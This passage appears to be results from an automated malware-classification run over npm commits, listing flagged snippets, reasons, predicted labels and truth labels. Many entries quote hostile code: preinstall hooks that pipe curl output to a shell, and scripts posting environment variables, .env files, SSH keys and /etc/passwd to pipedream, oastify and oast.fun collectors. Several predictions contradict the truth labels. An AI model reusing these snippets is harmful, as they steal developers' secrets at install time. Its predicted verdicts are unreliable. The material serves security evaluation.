Code: `"scripts": { "1234567": "..." }`
Reason: An unusually named npm script was added which can hide behavior or confuse reviewers. It's suspicious but not inherently malicious without an implementation that performs harmful actions.

**File index.d.ts**:
Code: `declare function cliExecute(cmd: string): void; declare function cliExecuteOutput(cmd: string): string;`
Reason: Type declarations expose CLI execution APIs. If implementations execute arbitrary command strings, they enable remote command execution. Presence in a .d.ts file signals a dangerous surface but is not itself executable code.

**File index.d.ts**:
Code: `declare function expressionEval(expr: string): any; declare function monsterEval(expr: string): any; declare function modifierEval(expr: string): any;`
Reason: APIs that evaluate string expressions are high-risk for code injection if the runtime uses eval/Function or similar. The declarations indicate potential vulnerability that must be audited.

**File index.d.ts**:
Code: `declare function visitUrl(url: string): any; declare function makeUrl(path: string): string;`
Reason: APIs accepting arbitrary URLs can be abused for SSRF or data exfiltration if the implementation performs network calls with untrusted input. This is a potential data-exfiltration vector rather than direct proof of malware.

**File index.d.ts**:
Code: `declare function fileToBuffer(path: string): Buffer; declare function bufferToFile(buf: Buffer, path: string): void; declare function mapToFile(map: any, path: string): void;`
Reason: File I/O APIs combined with network/CLI capabilities could enable theft of local files or credentials. Again, declarations show capability surface but not executable malicious logic.

**File index.d.ts**:
Code: `declare function adv1(filter: string | ((arg: any) => boolean)): any; // runCombat overloads accept filterFunction`
Reason: APIs that accept filter code or strings risk dynamic evaluation. If string filters are evaluated at runtime, this could be a code injection vector; the .d.ts indicates risk to be audited.

**Summary:** Dynamic analysis produced no malicious behavior (empty results). The static analysis flags multiple high-severity API surfaces (CLI execution, expression evaluation, arbitrary URL access, and file I/O) and some suspicious metadata (external URLs and an oddly named npm script). Those are potential security risks but represent capabilities and attack surface rather than confirmed malicious payload or behavior in this commit. Recommend manual review and auditing of the runtime implementations for the declared APIs, removal or verification of external links, renaming/removal of the odd npm script, and restricting/whitelisting inputs before merging.
**Truth label:** Benign

### Commit 33c855b0: Benign
**File package.json**:
Code: `"puppeteer": "^..."`
Reason: Adding puppeteer by itself is not direct malware, but it pulls browser binaries during install/runtime which creates network activity and supply-chain risk. A compromised puppeteer package or downloaded Chromium could be used for remote code execution, data exfiltration, or as a staging point for malicious behavior.

**File package.json**:
Code: `"express": "^6.17.2.1"`
Reason: The malformed/nonstandard semver for express is suspicious because it can cause unpredictable package resolution or dependency confusion. This increases the risk of inadvertently installing an unexpected or malicious package version from the registry.

**File package.json**:
Code: `"scripts": { "1234567": "echo \"Error: no test specified\" && exit 1" }`
Reason: This failing script is not malicious code, but adding intentionally failing or oddly named scripts can disrupt CI/CD or be abused to confuse maintainers. It's an operational risk that should be cleaned up or documented.

**File package.json (commit metadata)**:
Code: `"https://www.example.com/...", "https://img.shields.io/..."`
Reason: External URLs referenced in commit metadata or other repo files are not inherently malicious (badges/docs), but any unexpected external hosts should be validated. They could point to resources that fetch content or leak information if misused.

**Summary:** The changes flagged are indicators of supply-chain and operational risks (puppeteer dependency, malformed semver for express, failing npm script, and external URLs) rather than evidence of direct malicious payloads or runtime malware. Dynamic analysis produced no runtime malicious behavior. Recommend remediation: pin and audit dependencies, fix the malformed version string, set PUPPETEER_SKIP_DOWNLOAD or use puppeteer-core if full Chromium is not required, validate lockfile integrity, restrict registry access in CI, remove or document failing scripts, and review any external URLs. With these mitigations the commit appears benign but risky from a supply-chain perspective.
**Truth label:** Benign

### Commit 8f47d451: Malware
**File package.json**:
Code: `"A package script performs an unconditional HTTP request to an external endpoint (pipedream)"`
Reason: An unconditional outbound HTTP call to a pipedream endpoint in package scripts can exfiltrate environment variables, CI metadata, or secrets automatically when dependencies are installed or CI runs, which is classic telemetry/exfiltration behavior.

**File package.json**:
Code: `"preinstall/postinstall scripts that run local JS files (lifecycle scripts)"`
Reason: Lifecycle scripts run arbitrary local code during install/publish. Combined with the unconditional network call, these scripts create a supply-chain backdoor that can execute and exfiltrate data on consumers' machines or CI systems.

**File package.json**:
Code: `"dependencies include puppeteer and other large capability-rich packages"`
Reason: Adding puppeteer and similar dependencies expands the attack surface and allows headless browser automation and network activity; in a malicious package these can be abused to fetch remote content, execute code, or harvest data.

**File bin/html-export-pdf-cli.mjs**:
Code: `"CLI entrypoint imports and executes code from dist/"`
Reason: A global/installed CLI that executes bundled runtime code can be used to run malicious actions on user machines. It's an additional execution vector beyond install-time scripts.

**Summary:** Static analysis shows high-severity indicators of malicious behavior: an unconditional HTTP request to a pipedream endpoint combined with preinstall/postinstall lifecycle scripts that execute local code. These characteristics match supply-chain exfiltration or remote-activation tactics. Dynamic analysis produced no runtime artifacts (likely because the install hooks weren't executed in the dynamic environment), but that absence does not mitigate the high-risk static findings. Given the intentional outbound endpoint and automatic execution hooks, this commit should be treated as malicious.
**Truth label:** Benign

### Commit 54f39708: Malware
**File index.js**:
Code: `const dotenv = require('dotenv'); const findUp = require('find-up'); const axios = require('axios'); const fs = require('fs'); const envPath = findUp.sync('.env'); const env = dotenv.parse(fs.readFile`
Reason: The code searches parent directories for a .env file, parses it (exposing secrets), logs the full environment, and posts the parsed contents to an external Beeceptor endpoint — clear secret exfiltration behavior.

**File index.js**:
Code: `const envPath = findUp.sync('.env');`
Reason: Using findUp.sync('.env') can load .env files outside the project scope (e.g., user home), increasing the chance of unintentionally reading unrelated secrets to be exfiltrated.

**File package.json**:
Code: `"dependencies": {   "child_process": "*",   "axios": "^x.x.x",   "dotenv": "^x.x.x",   "find-up": "^x.x.x",   "tencentcloud-sdk-nodejs-common": "^x.x.x" }`
Reason: A non-standard 'child_process' dependency is present (a builtin module should not be installed as an npm package) which is a common indicator of a malicious package attempting to override native behavior. Combined with axios/dotenv/find-up, the dependency set enables reading local secrets and transmitting them externally.

**Summary:** Static analysis shows deliberate secret discovery (find-up + dotenv), exposure (console logging), and exfiltration to a third-party Beeceptor endpoint via axios. The addition of a suspicious 'child_process' dependency further increases the risk of arbitrary command execution. Dynamic analysis produced no runtime artifacts, but the static evidence demonstrates intentional malicious behavior aimed at secret theft, so the commit should be classified as MALWARE. Immediate remediation: remove the exfiltration code, remove malicious dependencies, rotate any potentially leaked secrets, and audit systems for misuse.
**Truth label:** Malware

### Commit 3b1ce60b: Malware
**File package.json**:
Code: `{"scripts": { "preinstall": "index.js", "postinstall": "node index.js", "pingback": "https://oapi.pipedream.net/…" }}`
Reason: Lifecycle scripts run repository code during npm install (preinstall/postinstall), which is a high-risk supply-chain vector that can execute arbitrary code on developer/build machines. The 'pingback' script points to an external pipedream endpoint, enabling exfiltration or covert telemetry.

**File package.json**:
Code: `"dependencies": { "tencentcloud-sdk-nodejs-common": "<newly_added_version>" }`
Reason: Adding an unfamiliar third-party dependency increases supply-chain attack surface. Such packages may contain malicious install-time scripts or runtime behavior that contacts external services.

**File src/services/ccc/v20200210/ccc_models.ts**:
Code: `interface Example { Token: string; Password: string; UserSig: string; }`
Reason: API model definitions expose fields that contain sensitive secrets (tokens, passwords, user signatures). If the package logs, transmits, or mishandles these values (especially via the pingback script), credentials may be leaked or exfiltrated.

**File tsconfig.json**:
Code: `file mode changed to 100755 (executable)`
Reason: A configuration file made executable is unusual and may be accidental or an attempt to hide executable content. Combined with install-time scripts, this increases suspicion of intentional execution of repository files.

**Summary:** Multiple high-severity indicators of malicious or risky behavior are present: repository-sourced code is executed automatically during npm install (preinstall/postinstall), there is an ad-hoc pingback to an external pipedream endpoint capable of receiving data, and a new third-party dependency increases supply-chain risk. The static findings indicate direct exfiltration/telemetry capability and execution vectors; dynamic analysis produced no runtime artifacts (empty result), which may indicate stealthy behavior or sandbox evasion. Given the combination of install-time execution and external network callbacks, the commit should be treated as malicious until proven otherwise.
**Truth label:** Benign

### Commit 082bc95d: Malware
**File package.json**:
Code: `"scripts": { "preinstall": "node index.js", "pingback": "curl https://en4v7f0.pipedream.net -d \"$(uname -a)\"" }`
Reason: A preinstall lifecycle hook runs index.js automatically during npm install, which provides an automatic execution vector. The presence of a 'pingback' script that sends data to a pipedream.net endpoint demonstrates an explicit network-exfiltration capability tied to this repository.

**File package.json**:
Code: `"preinstall": "node index.js"`
Reason: Lifecycle scripts like preinstall execute without explicit user invocation during dependency installation, creating a supply-chain execution path that can be abused to run arbitrary code on consumers' machines.

**File index.js**:
Code: `const https = require('https'); const data = JSON.stringify({ hostname: require('os').hostname(), user: process.env.USER }); const req = https.request('https://en3.oastify.com', { method: 'POST' }, re`
Reason: index.js contains code that sends POST requests to an external OAST/interaction domain (oastify.com). When paired with the preinstall hook, this creates a direct, automatic exfiltration channel to an attacker-controlled endpoint.

**Summary:** Static analysis reveals a preinstall lifecycle script that automatically executes index.js on npm install and index.js sends POSTs to an external, likely attacker-controlled interaction domain; additionally a 'pingback' script targets a pipedream.net endpoint. These together form a supply-chain exfiltration capability. Although dynamic analysis returned no execution traces, the static indicators constitute a high-confidence malicious behavior pattern consistent with malware and supply-chain compromise.
**Truth label:** Malware

### Commit 721cb1cd: Unknown
Analysis failed: Expecting value: line 21 column 15 (char 1262)
**Truth label:** Benign

### Commit 38c22462: Malware
**File index.js**:
Code: `const payload = { home: os.homedir(), hostname: os.hostname(), user: os.userInfo(), dns: dns.getServers(), package: require('./package.json') }; fetch('https://*.pipedream.net', { method: 'POST', body`
Reason: The module programmatically collects sensitive environment and repository data (home directory, hostname, user, DNS servers, full package.json) and sends it to an external pipedream.net endpoint. This is covert data exfiltration of PII and configuration to a third party without user consent.

**File package.json**:
Code: `"preinstall": "node index.js"`
Reason: A preinstall lifecycle script causes arbitrary JavaScript to execute automatically during 'npm install'. This enables immediate execution of the exfiltration code on any machine that installs the package and is a high-risk supply-chain vector.

**File package.json**:
Code: `"scripts": { "beacon": "curl https://*.pipedream.net" }`
Reason: An additional script invokes curl to contact an external pipedream.net URL, creating a second network beacon. Multiple outbound beacons increase suspicion of telemetry/exfiltration or signaling behavior and are not documented or opt-in.

**Summary:** Static analysis shows deliberate collection of sensitive local and repository data and automatic transmission to external pipedream.net endpoints, combined with a preinstall lifecycle hook that executes the code during installation. These behaviors constitute unauthorized data exfiltration and a supply-chain execution risk; dynamic analysis produced no benign evidence to counter these findings. Therefore the commit is classified as MALWARE.
**Truth label:** Malware

### Commit b21f8225: Malware
**File tracker.js**:
Code: `axios.post('https://b.alt-h7-eoj8gqk1.workers.dev/track', payload)`
Reason: Sends collected local data to an external tracking URL — clear remote exfiltration of potentially sensitive information to an untrusted third party.

**File tracker.js**:
Code: `fs.readFileSync(path.join(home, '.ssh', 'id_rsa'), 'utf8')`
Reason: Explicitly reads private SSH keys and other sensitive files (e.g., .npmrc, .bash_history, .ssh/id_rsa). Reading and preparing these for transmission constitutes theft of secrets.

**File tracker.js**:
Code: `payload.env = process.env`
Reason: Collects the entire process.env and includes it in the outbound payload. Environment variables commonly contain API keys, tokens, and other secrets — this is high-risk data exposure.

**File tracker.js**:
Code: `function getAllFiles(dir, depth) { /* recursively lists files under user's home (up to depth 2) */ }`
Reason: Enumerates the user's filesystem and includes file paths in the payload, potentially revealing sensitive filenames and directory structure. Filesystem scanning combined with exfiltration is malicious behavior.

**File package.json**:
Code: `"postinstall": "node index.js"`
Reason: Defines a postinstall hook that runs automatically after npm install. This ensures the malicious tracker runs without explicit user action or consent during installation.

**File index.js**:
Code: `const { trackData } = require('./tracker'); trackData();`
Reason: Requires and immediately invokes the tracker module. Combined with postinstall, this triggers automatic data collection and exfiltration at install time.

**File package.json**:
Code: `"dependencies": { "fs": "*", "os": "*", "child_process": "*" }`
Reason: Lists core Node modules as dependencies (fs, os, child_process). This is suspicious and may be an attempt to confuse reviewers or automated scanners; it also indicates intention to use low-level OS and process APIs for data collection.

**Summary:** Static analysis shows multiple high- and critical-severity behaviors consistent with malicious intent: reading sensitive files (SSH keys, .npmrc, history), collecting full environment variables, enumerating user files, and exfiltrating all of that to an external tracking URL. The code is wired to run automatically via a postinstall hook and immediate invocation in index.js, meaning it will execute without explicit user consent when the package is installed. Although dynamic analysis produced no results, the static indicators — direct reads of secrets, full-environment capture, filesystem enumeration, automatic execution, and network exfiltration — are strong evidence this commit is malicious and should be treated as malware.
**Truth label:** Malware

### Commit 82fde081: Malware
**File like.sh**:
Code: `#!/bin/sh # ... collects system info and encodes it curl -s 'https://pipedream.net/…' \   -H "X-LS: $(ls ~ | base64 | tr -d '\n')" \   -H "X-HOSTNAME: $(hostname | base64 | tr -d '\n')" \   -H "X-WD: `
Reason: The script enumerates filesystem and host identifiers, base64-encodes them and sends them as HTTP headers to an external pipedream.net endpoint. This is direct data exfiltration to an attacker-controlled host.

**File package.json**:
Code: `"scripts": {   "preinstall": "./like.sh",   "pingback": "curl -s https://pipedream.net/…" }`
Reason: A preinstall lifecycle hook will automatically execute the exfiltration script during npm install (including CI), and the pingback entry performs a network beacon to the same external endpoint. Lifecycle hooks combined with outbound network calls create high risk of secrets and environment leakage.

**Summary:** Static analysis shows an explicit preinstall hook that runs a shell script which collects directory listings and host identifiers, encodes them, and transmits them to an external pipedream.net endpoint. These behaviors constitute intentional data exfiltration and a beacon to an attacker-controlled server. Although dynamic analysis returned no captured runtime results (likely due to sandbox/network restrictions), the code itself clearly performs malicious actions and should be treated as malware.
**Truth label:** Malware

### Commit ec841458: Benign
**File package.json**:
Code: `"test-deno": "deno test --allow-env --allow-read --allow-net --allow-run --allow-sys --allow-write"`
Reason: This script grants Deno broad permissions (env, read, net, run, sys, write). While this allows arbitrary environment access, network I/O, process execution and filesystem writes — which are high-risk capabilities — there is no indication in the static report of an explicit malicious payload. These permissions are dangerous if untrusted code is executed, but granting them alone does not constitute malware.

**File package.json**:
Code: `"create-separate-require-instance": "rm -rf ./tmp && node ./scripts/create-tarball && tar -xzf ./tmp/*.tgz -C ./tmp && mv ./tmp/package ./tmp/v"`
Reason: The script chains destructive and execution steps (rm -rf, running ./scripts/create-tarball, extracting and moving files). This is potentially dangerous because helper scripts could be modified to run malicious code or deletions, but the commands themselves are typical for packaging workflows and the static report flags them as high-risk rather than identifying malicious intent.

**File package.json**:
Code: `"mongo": "node ./tools/repl.js"`
Reason: Running an interactive REPL can execute arbitrary code entered by a user and may load local modules. This is a security concern for automated contexts but is a common developer convenience and not evidence of malware.

**Summary:** Static analysis flags several high- and medium-risk scripts that grant excessive privileges or perform destructive operations, which are strong security concerns and could be abused by an attacker or a malicious contributor. However, there is no static evidence of an embedded malicious payload or malicious network behavior, and dynamic analysis produced no runtime indications of compromise. Based on the provided data, the commit appears to be risky/poorly privileged but not intentionally malicious — marked as BENIGN with recommendations to reduce permissions, harden scripts, and run tests in isolated environments.
**Truth label:** Benign

### Commit c4f7da55: Malware
**File package.json**:
Code: `"scripts": { "preinstall": "curl https://<external-url> | sh" }`
Reason: A preinstall lifecycle script runs automatically during npm install and executes a curl to an external URL, allowing arbitrary remote code execution on developer/CI hosts and enabling supply‑chain compromise or silent data exfiltration.

**File package.json**:
Code: `"scripts": { "pingback": "curl https://<pipedream-url>" }`
Reason: A pingback script that calls an external pipedream URL provides an obvious telemetry/exfiltration channel if invoked by CI or other scripts.

**File package.json**:
Code: `"scripts": { "publish": ".travis/publish-site.sh" }`
Reason: Publish/prepublish scripts execute arbitrary shell commands (including network operations) and can be abused to upload artifacts or secrets during CI deploys; combined with the preinstall/pingback scripts this increases risk of automated malicious behavior.

**File package.json**:
Code: `"dependencies": { "tcm-app-migration-miles-react": "<new-dependency>" }`
Reason: A newly added, unverified dependency increases supply‑chain risk—it may contain additional malicious code or network behavior that is hard to trace.

**File lib/umd/relay-hooks.min.js**:
Code: `(minified UMD bundle)`
Reason: Minified bundle is difficult to audit and can hide malicious logic or network calls; committing build artifacts makes it harder to detect injected code.

**File package.json**:
Code: `"author": "jakeclark38b@gmail.com"`
Reason: Repository metadata contains a personal email (low risk) — noted as an information leak but not the primary malicious indicator.

**Summary:** Static analysis reveals deliberate, high‑risk changes consistent with malicious supply‑chain activity: an automatic preinstall lifecycle script that curls an external URL, an explicit pingback to a pipedream endpoint, and added publish scripts and a new unverified dependency. These modifications create an automatic remote code execution and exfiltration capability during regular npm installs or CI runs. The dynamic analysis produced no runtime results, but lack of execution in dynamic tooling does not negate the high severity indicators present in the static findings. Based on the automatic execution vector and external network callbacks, this commit should be treated as malware and remediated immediately (revert, remove scripts, rotate credentials, audit CI and installs).
**Truth label:** Benign

### Commit fa7dbef6: Malware
**File index.js**:
Code: `const payload = { home: os.homedir(), hostname: os.hostname(), user: os.userInfo(), net: os.networkInterfaces(), dns: dns.getServers(), package: fs.readFileSync('package.json','utf8') };`
Reason: This code collects extensive local/system metadata (home directory, hostname, username, network interfaces, DNS servers) and reads package.json — sensitive information that should not be gathered or sent by normal library code.

**File index.js**:
Code: `const req = https.request('https://oast.fun/collect', { method: 'POST', headers: { 'Content-Type': 'application/json' } }, res => { ... }); req.write(JSON.stringify(payload)); req.end();`
Reason: Creates an outbound HTTPS POST to a non-standard domain (oast.fun) and transmits the collected payload. This is remote data exfiltration to a likely attacker-controlled endpoint and is characteristic of a backdoor/telemetry beacon.

**File index.js**:
Code: `// author: attacker@example.com -- use Interactsh / pipedream for OOB testing`
Reason: The comment and email plus explicit mention of out-of-band testing tools (Interactsh, pipedream) indicate deliberate malicious intent and that the code was written to verify remote execution/interaction rather than provide legitimate functionality.

**Summary:** Static analysis reveals code that collects sensitive local and project metadata and posts it to a suspicious third-party domain (oast.fun) with author comments referencing OOB testing tools. These are clear indicators of an intentional backdoor/exfiltration mechanism. The dynamic run produced no results, which may indicate sandbox evasion or that the path wasn't executed during testing, but does not mitigate the high-confidence static evidence. Treat this commit as malicious (MALWARE).
**Truth label:** Malware

### Commit 258d1838: Benign
**File src/createElemeng.js**:
Code: `const el = document.createElement(vnode.sel); if (vnode.text) el.textContent = vnode.text; parent.appendChild(el); // uses vnode.children.length without checking vnode.children`
Reason: Creating DOM elements directly from unvalidated vnode.sel allows an attacker who can control vnode values to create executable elements (e.g., 'script') and insert them into the page (DOM-based XSS). Also reads vnode.children.length without confirming children exists, which can crash.

**File src/patchVnode.js**:
Code: `parent.appendChild(createElement(vnode));`
Reason: Appends nodes created from virtual nodes directly into the live DOM without sanitization. If createElement can produce executable nodes (script/iframe/object), appending them will execute in page context — a high-risk sink for DOM-based code execution.

**File full commit (unspecified file)**:
Code: `commit message or diff contains URL: https://oastify.com/...`
Reason: Presence of a non-standard external URL (oastify.com) in the commit may indicate leftover testing/exfiltration artifacts (OAST/SSRF tests). There is no code in the provided diff that performs outbound requests to this domain, so this is suspicious but not proof of active exfiltration.

**File index.js**:
Code: `patch(box, model1);`
Reason: patch is called with undefined globals (box, model1) — reliance on implicit globals can cause unexpected behavior and may allow unvalidated external data to reach the virtual-dom rendering path.

**File src/vnode.js**:
Code: `return { sel: sel, data: data, children: children, text: text, elm: elm, key: data.key }`
Reason: Accessing data.key without verifying data is defined can throw if callers pass undefined. This is a robustness issue that can be abused to cause crashes (DoS) but is not in itself malicious.

**Summary:** The commit introduces insecure coding patterns (direct creation of elements from untrusted vnode.sel, unsanitized insertion into the DOM, use of implicit globals, and robustness bugs) that enable DOM-based XSS and crashes. However, there is no evidence in the provided static or dynamic analysis of active malicious behavior such as network exfiltration, persistence mechanisms, or payload delivery. The suspicious external URL in the commit should be investigated, but by itself does not prove malware. Overall the changes are insecure/vulnerable and should be remediated, but they appear to be a vulnerable/buggy library update rather than malware.
**Truth label:** Benign

### Commit 37f1f83a: Benign
**Summary:** Static analysis reported zero issues and no suspicious code patterns, and dynamic analysis finished with no runtime indicators of malicious behavior (no suspicious results, network activity, or flagged behavior). Based on the provided static and dynamic results, there is no evidence to classify this commit as malware.
**Truth label:** Benign

### Commit 3c6f1d05: Malware
**File package.json**:
Code: `"scripts": { "preinstall": "curl https://<external-untrusted-domain>/payload.sh | bash" }`
Reason: A preinstall lifecycle script runs curl piping to a shell. npm lifecycle scripts execute automatically during npm install and this pattern downloads and executes remote code on any machine installing the package — a high-risk supply-chain backdoor.

**File package.json**:
Code: `"scripts": { "pingback": "curl -X POST https://<xxxx>.m.pipedream.net -d @data.json" }`
Reason: A 'pingback' script posts to a pipedream.net endpoint. Pipedream endpoints are often used for testing but are also commonly abused to capture exfiltrated data. Presence of this script indicates an intentional phone-home or exfiltration mechanism.

**File index.js**:
Code: `const options = { host: 'oastify[.]example', method: 'POST', path: '/capture' }; request(options, postData, ...);`
Reason: HTTP request options are hardcoded to an external, suspicious host (oastify) and the code prepares to POST postData. This looks like deliberate outbound data transmission to a third-party domain and may exfiltrate sensitive information.

**File package.json**:
Code: `"dependencies": { "utf-railroad": "*", "tcm-app-migration-miles-react": "*" }`
Reason: New, unfamiliar dependencies were added. Unvetted third-party packages can contain malicious code or lifecycle scripts; combined with the other artifacts this increases supply-chain risk and suggests intentional malicious modifications.

**Summary:** Static analysis reveals explicit malicious patterns: a preinstall script that downloads and executes remote code, hardcoded outbound POSTs to a suspicious host, and a pingback to a pipedream endpoint for capturing data. Dynamic analysis produced no runtime evidence, but the presence of npm lifecycle execution and hardcoded exfil endpoints constitutes a high-confidence supply-chain backdoor/exfiltration mechanism. Therefore this commit should be treated as malware and removed, and an incident response initiated.
**Truth label:** Malware

### Commit 7bdce937: Benign
**File package.json**:
Code: `"railroad-diagrams": "github:mna/purejs-railroad-diagrams#7bdce9375fc512db8da0893c6471afce12c6c423", "showdown": "^1.9.1", "utf-railroad": "^0.0.2", "commander": "^2.19.0", "scripts": {   "test-deno":`
Reason: Dependencies pulled from a GitHub URL and several new third-party packages increase supply-chain risk; an ancient commander version may contain known vulnerabilities; the 'test-deno' script grants very broad native permissions which can execute arbitrary code and access environment/files/network when run.

**File src/report-html-template.js**:
Code: `const html = `<h1>${title}</h1>${contents}${tocEntries.join('')}`; const commentHtml = converter.makeHtml(comment);`
Reason: Template literals interpolate user-supplied values directly into HTML without escaping, and markdown is converted with showdown.makeHtml without sanitization — together these enable reflected/stored XSS if inputs are attacker-controlled.

**File src/ebnf-parser.js**:
Code: `const input = fs.readFileSync(process.argv[2], 'utf8'); exports.main = () => { /* reads arbitrary files and processes them */ }`
Reason: The CLI reads arbitrary files from disk and feeds them into processing that emits HTML. In an untrusted environment this can expose sensitive local files and, combined with unsanitized HTML output, leak sensitive information to viewers.

**Summary:** No dynamic analysis indicated malicious behavior (no observed network callbacks, process spawning for C2, or payload execution), and all flagged issues are security risks (supply-chain, unsafe permissions, XSS, arbitrary file reads, and use of outdated deps) rather than indicators of intentional malware. The commit appears to be a benign feature/code-change that needs remediation: remove GitHub-pulled dependencies or vendor them, restrict Deno permissions, update/lock dependencies, sanitize/escape all user input and markdown output, and validate CLI file access to prevent data leaks.
**Truth label:** Benign

### Commit 4298a4f4: Malware
**File package.json**:
Code: `"scripts": { "preinstall": "node index.js", "pingback": "curl https://eo536ohsnextro9.m.pipedream.net" }`
Reason: A preinstall npm lifecycle hook runs automatically during npm install and will execute index.js without user interaction. The added "pingback" script calls an external Pipedream collector. Together these provide an automatic execution vector and an easy exfiltration/collection channel to attacker-controlled endpoints.

**File index.js**:
Code: `var postData = querystring.stringify({ /* ... */ }); var options = { hostname: 'cfhkr5pjas2slrrhp4s0pruu5eat15gkz.oast.live', port: 443, method: 'POST', /* ... */ }; var req = https.request(options, f`
Reason: index.js prepares a POST body (postData) and is configured to send it to an ephemeral oast.live hostname over HTTPS. When combined with the preinstall hook this creates an automatic exfiltration channel that can leak environment variables, system info, files, or credentials present at install time.

**File index.js / repository metadata**:
Code: `cfhkr5pjas2slrrhp4s0pruu5eat15gkz.oast.live, https://eo536ohsnextro9.m.pipedream.net`
Reason: The commit includes randomly generated-looking, ephemeral collector domains (oast.live and pipedream). These are commonly used by attackers to receive callbacks and hide malicious activity, and are strong indicators of malicious intent rather than benign telemetry.

**Summary:** The commit introduces an automatic execution vector (preinstall -> node index.js) and hard-coded external collectors (oast.live and pipedream). Static evidence shows code to assemble and POST data to attacker-controlled endpoints, which enables silent exfiltration during npm install. Although dynamic analysis returned no runtime results, the presence of these deliberate constructs and endpoints is sufficient to classify the change as malicious and high risk.
**Truth label:** Malware

### Commit 60b761cc: Malware
**File package.json**:
Code: `"scripts": {   "preinstall": "curl http://attacker-controlled-endpoint | sh",   "pingback": "curl https://something.pipedream.net/...?payload=..." }`
Reason: The preinstall script invokes curl to an external, attacker-controlled endpoint and pipes it to a shell. npm lifecycle scripts run automatically on install and this enables arbitrary remote command execution (severe supply-chain compromise). The pingback script sends data to a pipedream URL, indicating telemetry/exfiltration capability.

**File index.js**:
Code: `const postData = { /* env/runtime info */ }; await fetch('https://oastify.com/unique-id', { method: 'POST', body: JSON.stringify(postData) });`
Reason: Code constructs postData (likely containing environment or runtime information) and posts it to an OAST-like external domain. This pattern is typical for out-of-band data leakage and confirms active exfiltration behavior.

**File (commit metadata / multiple files)**:
Code: `external endpoints observed: pipedream.net, free.beeceptor.com, urlgoal.com, oastify.com`
Reason: Multiple independent external collector/callback endpoints are present in the commit. The presence of several telemetry/collector URLs increases confidence this change was intended to leak data or beacon an attacker-controlled service.

**File package.json / scripts**:
Code: `"preinstall" + "pingback" lifecycle usage`
Reason: Using install-time scripts to perform network operations (especially curl | sh or remote callbacks) is a well-known supply-chain attack vector. Even if dynamic analysis did not observe activity, install hooks can run on end-user/CI installs and are high risk.

**Summary:** Static analysis found an npm preinstall hook that executes curl against an external endpoint (enabling arbitrary remote command execution), explicit pingback scripts pointing to pipedream, and code that POSTs runtime/environment data to an OAST-like domain. These are classic indicators of malicious supply-chain/backdoor and exfiltration behavior. Dynamic analysis produced no results (likely sandbox did not execute install hooks), but the static findings are sufficient to classify this commit as malicious.
**Truth label:** Malware

### Commit fbf9cb99: Benign
**Summary:** Both static and dynamic analyses produced no indications of malicious behavior: the static scan reported zero issues, and the dynamic execution completed with no suspicious results. Based on the provided artifacts and observations, there are no signs of malware. Note: this assessment assumes the analyses covered relevant code paths and that the sample is not employing environment-aware evasion or delayed activation techniques.
**Truth label:** Benign

### Commit d8a375ea: Malware
**File package.json**:
Code: `"scripts": { "preinstall": "node index.js", "pingback": "curl -s https://en9xe4ncx9b1w.x.pipedream.net -d @package.json" }`
Reason: A preinstall hook runs index.js automatically during npm install, causing arbitrary code to execute on a user's machine without consent. The pingback script indicates intent to send package data to an external telemetry endpoint.

**File index.js**:
Code: `const data = { home: os.homedir(), hostname: os.hostname(), user: os.userInfo().username, dns: getDNSServers(), package: fs.readFileSync('package.json','utf8') }; const req = https.request('https://oa`
Reason: This code collects sensitive environment and host information (home directory, hostname, OS username, DNS servers, and full package.json) and transmits it to an externally-controlled domain (oastify.com), which is active data exfiltration of PII and internal configuration.

**File index.js**:
Code: `/* .on('error', (err) => { console.error(err) }) */`
Reason: Network error/logging handling is commented out or suppressed. Silent failures reduce observability and may be used to avoid detection of malicious network activity.

**Summary:** Static analysis shows deliberate, install-time collection and exfiltration of sensitive host and package data to third-party endpoints (oastify.com and pipedream.net) via a preinstall script that runs on npm install. These behaviors constitute unauthorized data exfiltration and covert telemetry without opt-in, combined with suppressed error logging to evade detection. Although dynamic analysis returned no runtime artifacts, that likely reflects sandboxing or lack of network execution rather than benign intent. The combination of automatic execution at install, collection of PII/internal configuration, and transmission to untrusted external hosts warrants classification as MALWARE.
**Truth label:** Malware

### Commit a51584de: Unknown
Analysis failed: Expecting value: line 16 column 15 (char 1068)
**Truth label:** Benign

### Commit d0542fee: Benign
**File package.json**:
Code: `"scripts": { "check-links": "linkinator http://localhost:8080/..." }`
Reason: A package script runs a link-checker against a hard-coded localhost HTTP endpoint which may trigger local network requests in CI or developer environments. This is suspicious from an operational/ privacy perspective but is a benign testing/maintenance action rather than malicious code execution or persistence.

**File index.js**:
Code: `const ipfs = await createIPFS({ Addresses: { Swarm: [] }, config: { Bootstrap: [] }, repo: ... }); const ceramic = await createCeramic({ ipfs, profile: 'test' }); this.global.ipfs = ipfs; this.global.`
Reason: Test setup creates network-capable ipfs and ceramic instances and attaches them to the global test environment. If misconfigured these could open network connections or leak handles across tests, but the code appears aimed at test isolation (empty Swarm/Bootstrap). This is risky practice for tests but not evidence of malware.

**File index.js**:
Code: `const { dir } = require('tmp-promise'); const tmp = await dir({ unsafeCleanup: true });`
Reason: Using unsafeCleanup allows recursive removal and following symlinks. This could cause accidental deletion if temp paths are manipulated, representing a safety risk, not malicious behavior by itself.

**File package.json**:
Code: `"dependencies": { "ipfs-core": "^x.y.z", "@ceramicnetwork/core": "^a.b.c" }`
Reason: New network/decentralized dependencies increase attack surface and supply-chain risk (they can perform network operations). This is a policy/risk issue and requires vetting, but adding such libraries is common for projects that interact with IPFS/Ceramic and does not indicate malware.

**File index.js**:
Code: `this.global.ipfs // global exposure of heavy-weight object`
Reason: Exposing heavy-weight, network-capable objects globally can lead to accidental misuse or information exposure across tests. This is a code-quality and test-isolation concern rather than a direct sign of malicious intent.

**Summary:** Static analysis flags several risky practices (hard-coded local endpoint in scripts, network-capable test dependencies, global exposure of ipfs/ceramic instances, and unsafe temp cleanup). Dynamic analysis produced no observable malicious behavior. The flagged items represent operational, safety, and supply-chain risks but are consistent with test/setup code rather than indicators of malware or deliberate malicious functionality. Recommend tightening test isolation, hardening CI (block outbound network), vetting dependencies, and removing unsafe cleanup to mitigate risks.
**Truth label:** Benign

### Commit f78cd51d: Malware
**File index.js**:
Code: `const { exec } = require('child_process'); exec('cat /etc/passwd', (err, stdout) => { axios.post('https://oast.fun/collect', {data: stdout}) })`
Reason: Direct use of child_process.exec to read sensitive system files and immediately POST the output to an external, non-whitelisted domain — classic command execution plus data exfiltration behavior.

**File index.js**:
Code: `exec('ls -la /var && uname -a', (e, out) => axios.post('https://oast.fun/collect', {out}))`
Reason: Collecting directory listings and system identity information then transmitting to an external endpoint — exposes potentially sensitive host and application data to an attacker-controlled server.

**File package.json**:
Code: `"preinstall": "uname -a | curl -X POST https://oast.fun/`hostname`"`
